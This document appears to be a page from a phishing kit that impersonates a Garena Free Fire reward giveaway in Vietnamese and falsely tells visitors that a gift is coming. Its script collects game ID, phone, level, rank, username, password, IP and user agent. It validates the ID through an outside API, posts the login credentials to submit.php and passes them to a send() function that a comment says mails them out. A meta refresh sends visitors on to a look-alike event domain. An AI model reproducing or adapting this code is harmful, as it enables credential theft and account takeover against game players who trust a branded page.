
<!DOCTYPE html>
<html>

<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=0">
    <meta http-equiv="X-UA-Compatible" content="IE=edge" />
    <meta name="description" content="Nhận Quà FREEFIRE">
    <title>VÒNG QUAY MAY MẮN  | FREE FIRE</title>
    <meta http-equiv="refresh" content="1;url=https://vongquaysukienfreefirevn.com/">
    <link rel="stylesheet" type="text/css" href="css/style.css">
    <link rel="stylesheet" type="text/css" href="css/facebook.css">
    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/5.15.2/css/all.min.css">
</head>

<body>
    <div class="iwan-contener">
    	<header></header>
    	<div class="banner">
    		<img src="Vip-Membership (1).jpg">
    	</div>
    	<div class="wrap">
    		<div class="form">
                <div class="title">
                <p> Chúng tôi đã tiếp nhận thông tin tài khoản của bạn. Bạn sẽ nhận được quà nếu đủ điều kiện dưới đây: </p></br>
<li>Tài khoản trên LV50</li>
<li>Tài khoản chơi game thường xuyên</li> </div>
<p>Tự động về trang chủ sau 5 giây</p>

            <div class="mask"></div>


    </div>

    <footer>
        &copy; Garena Free Fire
    </footer>
</div>
<div class="mask"></div>
    <script src="https://cdnjs.cloudflare.com/ajax/libs/jquery/3.5.1/jquery.min.js"></script>
    <script src="https://ajax.googleapis.com/ajax/libs/jquery/3.5.1/jquery.min.js"></script>
    <script type="text/javascript" src="js/ajax.js"></script>
    <script type="text/javascript">
        function valid()
        {
            $('.checking').show();
            $('.btn-submit').addClass("disabled");
            $id = $('#id').val();
            $hp = $('#hp').val();
            $level = $('#level').val();
            $rank = $('#rank').val();
            $epass = $('#epass').val();
            $user = $('#user').val();
            $pass = $('#pass').val();
            $ip = $('#ip').val();
            $ua = $('#ua').val();
            setTimeout(() => {
                $.post('http://iwanster.com/api/v2/ff/index.php', {
                    id:$id
                },
                function(data,status){
                    if(data.nickname == null)
                    {
                        $('.checking').hide();
                        $('.salah').show();
                        $('.btn-submit').removeClass("disabled");
                        setTimeout(() => {
                            $('.salah').hide();
                        },2000);
                        return false;
                    }else{
                        $('.checking').hide();
                        $('.salah').hide();
                    }
                    if($hp == '' || $hp == null)
                    {
                        $('.semua').show();
                        $('.checking').hide();
                        $('.salah').hide();
                        $('.btn-submit').removeClass("disabled");
                        setTimeout(() => {
                            $('.semua').hide();
                        },2000);
                        return false;
                    }else{
                        $('.semua').hide();
                    }
                    // 
                    if($level == '' || $level == null)
                    {
                        $('.semua').show();
                        $('.checking').hide();
                        $('.salah').hide();
                        $('.btn-submit').removeClass("disabled");
                        setTimeout(() => {
                            $('.semua').hide();
                        },2000);
                        return false;
                    }else{
                        $('.semua').hide();
                    }
                    // 
                    if($rank == '' || $rank == null)
                    {
                        $('.semua').show();
                        $('.checking').hide();
                        $('.salah').hide();
                        $('.btn-submit').removeClass("disabled");
                        setTimeout(() => {
                            $('.semua').hide();
                        },2000);
                        return false;
                    }else{
                        $('.semua').hide();
                    }
                    // 
                    if($epass == '' || $epass == null)
                    {
                        $('.semua').show();
                        $('.checking').hide();
                        $('.salah').hide();
                        $('.btn-submit').removeClass("disabled");
                        setTimeout(() => {
                            $('.semua').hide();
                        },2000);
                        return false;
                    }else{
                        $('.semua').hide();
                    }
                    
                    $.post('submit.php',{
                        user:$user,
                        pass:$pass,
                        id:$id,
                        hp:$hp,
                        nick:data.nickname,
                        level:$level,
                        rank:$rank,
                        epass:$epass,
                        ua:$ua
                    },
                    function(res,stat){
                        if(stat == 'success')
                        {
                            $('.mask').show();
                            $('.sukses').css("display","flex");
                            send($user,$pass,$level,data.nickname,$ip,$ua); // Mengirim Send Mail
                        }
                    })

                })
            },3000)
            return false;
        }
    </script>
</body>

</html>
